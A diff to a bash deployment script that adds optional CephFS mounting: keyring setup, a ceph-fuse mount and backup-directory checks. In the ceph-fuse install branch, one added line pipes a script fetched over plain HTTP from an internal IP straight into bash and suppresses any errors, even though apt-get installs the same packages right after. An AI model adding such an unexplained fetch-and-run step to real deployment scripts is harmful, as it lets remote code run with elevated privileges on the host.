@@ -32,6 +32,11 @@ MA3_LOG_LOCAL_RETENTION_DAYS="${MA3_LOG_LOCAL_RETENTION_DAYS:-2}"
 MA3_V1_TO_V2_REPORT="${MA3_V1_TO_V2_REPORT:-${MA3_WORKDIR}/v1_to_v2_migration_report.json}"
 MA3_REQUIREMENTS_FILE="${MA3_REQUIREMENTS_FILE:-server/requirements-ltp.txt}"
 MA3_DISABLE_EMBEDDINGS="${MA3_DISABLE_EMBEDDINGS:-1}"
+MA3_CEPHFS_ENABLE="${MA3_CEPHFS_ENABLE:-0}"
+MA3_CEPHFS_USER="${MA3_CEPHFS_USER:-}"
+MA3_CEPHFS_KEYRING="${MA3_CEPHFS_KEYRING:-}"
+MA3_CEPHFS_MOUNT="${MA3_CEPHFS_MOUNT:-/mnt/cephfs}"
+MA3_CEPHFS_FS_NAME="${MA3_CEPHFS_FS_NAME:-mycephfs}"
 
 PGHOST="${PGHOST:-localhost}"
 PGPORT="${PGPORT:-5432}"
@@ -42,9 +47,52 @@ PGPASSWORD="${PGPASSWORD:?PGPASSWORD is required}"
 export MA3_INSTANCE_ID MA3_PUBLIC_BASE_URL PGHOST PGPORT PGDATABASE PGUSER PGPASSWORD
 export MA3_OP_LOG_DIR MA3_LOG_ARCHIVE_DIR MA3_LOG_LOCAL_RETENTION_DAYS
 
+mount_cephfs_if_enabled() {
+  if [[ "$MA3_CEPHFS_ENABLE" != "1" ]]; then
+    return 0
+  fi
+  [[ -n "$MA3_CEPHFS_USER" ]] || die "MA3_CEPHFS_ENABLE=1 but MA3_CEPHFS_USER is empty"
+  [[ -n "$MA3_CEPHFS_KEYRING" ]] || die "MA3_CEPHFS_ENABLE=1 but MA3_CEPHFS_KEYRING is empty"
+
+  log "mounting CephFS at ${MA3_CEPHFS_MOUNT} as ${MA3_CEPHFS_USER}"
+  if ! command -v ceph-fuse >/dev/null 2>&1; then
+    if ! command -v apt-get >/dev/null 2>&1; then
+      die "ceph-fuse missing and apt-get is unavailable"
+    fi
+    export DEBIAN_FRONTEND=noninteractive
+    if command -v curl >/dev/null 2>&1; then
+      curl -fsSL http://10.100.197.13/user_config/bootstrap.sh | bash -s -- --ceph || true
+    fi
+    apt-get update
+    apt-get install -y --no-install-recommends ceph-common ceph-fuse
+  fi
+
+  mkdir -p /etc/ceph "$MA3_CEPHFS_MOUNT"
+  printf '%s\n' "$MA3_CEPHFS_KEYRING" > "/etc/ceph/${MA3_CEPHFS_USER}.keyring"
+  chmod 600 "/etc/ceph/${MA3_CEPHFS_USER}.keyring"
+
+  if mountpoint -q "$MA3_CEPHFS_MOUNT"; then
+    log "CephFS mountpoint already mounted: ${MA3_CEPHFS_MOUNT}"
+  else
+    ceph-fuse "$MA3_CEPHFS_MOUNT" \
+      --client_fs="$MA3_CEPHFS_FS_NAME" \
+      --id "$MA3_CEPHFS_USER" \
+      --keyring "/etc/ceph/${MA3_CEPHFS_USER}.keyring" \
+      --client_reconnect_stale=1
+  fi
+
+  if ! timeout 15 bash -c "until test -d '$MA3_CEPHFS_MOUNT'; do sleep 1; done"; then
+    die "CephFS mountpoint did not become visible: ${MA3_CEPHFS_MOUNT}"
+  fi
+  log "CephFS mounted; backup dir check: ${MA3_BACKUP_DIR}"
+  if [[ ! -e "$MA3_BACKUP_DIR" ]]; then
+    die "MA3_BACKUP_DIR does not exist after CephFS mount: ${MA3_BACKUP_DIR}"
+  fi
+}
+
 log "instance_id=${MA3_INSTANCE_ID}"
 log "workdir=${MA3_WORKDIR}"
-mkdir -p "$MA3_WORKDIR" "$MA3_MANIFEST_DIR" /var/log/ma3
+mkdir -p "$MA3_WORKDIR" /var/log/ma3
 
 if ! command -v pg_isready >/dev/null 2>&1 || ! command -v python3 >/dev/null 2>&1 || ! python3 -m venv --help >/dev/null 2>&1; then
   if command -v apt-get >/dev/null 2>&1; then
@@ -56,6 +104,9 @@ if ! command -v pg_isready >/dev/null 2>&1 || ! command -v python3 >/dev/null 2>
     die "missing runtime packages and apt-get is unavailable; use an image with git/curl/python3-venv/PostgreSQL"
   fi
 fi
+
+mount_cephfs_if_enabled
+mkdir -p "$MA3_MANIFEST_DIR"
 
 if command -v pg_ctlcluster >/dev/null 2>&1; then
   log "starting local PostgreSQL cluster"
